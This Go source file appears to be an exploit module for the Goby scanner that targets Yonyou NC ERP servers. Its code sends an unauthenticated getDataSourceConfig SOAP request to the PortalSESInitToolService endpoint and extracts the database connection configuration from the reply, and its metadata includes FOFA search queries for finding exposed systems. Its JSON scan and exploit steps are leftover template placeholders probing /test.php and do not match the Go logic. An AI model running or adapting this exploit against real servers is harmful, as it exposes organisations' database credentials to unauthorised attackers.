package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YonyouNC portalsesInittoolservice Information Disclosure Vulnerability",
    "Description": "<p>Yonyou NC is an abbreviation for Enterprise Resource Planning, which refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. Yonyou NC system is an information technology solution for integrated management of various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.</p>",
    "Product": "yonyou-UFIDA-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-09-13",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\" )",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (body=\"/Client/Uclient/UClient.exe\" && title==\"Yonyou UAP\" )",
    "Level": "0",
    "Impact": "<p>Its  has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "2H1W"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "用友NC portalsesInittoolservice 信息泄漏漏洞",
            "Product": "用友-UFIDA-NC",
            "Description": "<p>用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>系统存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "YonyouNC portalsesInittoolservice Information Disclosure Vulnerability",
            "Product": "yonyou-UFIDA-NC",
            "Description": "<p>Yonyou NC is an abbreviation for Enterprise Resource Planning, which refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. Yonyou NC system is an information technology solution for integrated management of various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"https://security.yonyou.com/#/patchList\">https://security.yonyou.com/#/patchList</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its&nbsp; has an information disclosure vulnerability that could allow unauthorized attackers to access sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`

	postOrGet_HBk1KGUTcS := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		rawPayload := "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:por=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">\n                 <soapenv:Header/>\n                 <soapenv:Body>\n                    <por:getDataSourceConfig/>\n                 </soapenv:Body>\n                </soapenv:Envelope>"

		resp, err := setPostRequest(hostInfo, fileUrl, rawPayload, defineHeader)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService": "<return>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_HBk1KGUTcS

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService", "<return>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_HBk1KGUTcS

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			regular := `<ns1:getDataSourceConfigResponse([\s\S]*)<\/ns1:getDataSourceConfigResponse>`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[0], nil
			}

			output, err := makeRegular(resp, regular)

			expResult.Success = true
			expResult.Output = "泄露信息：数据库连接信息\n" + output
			return expResult
		},
	))
}
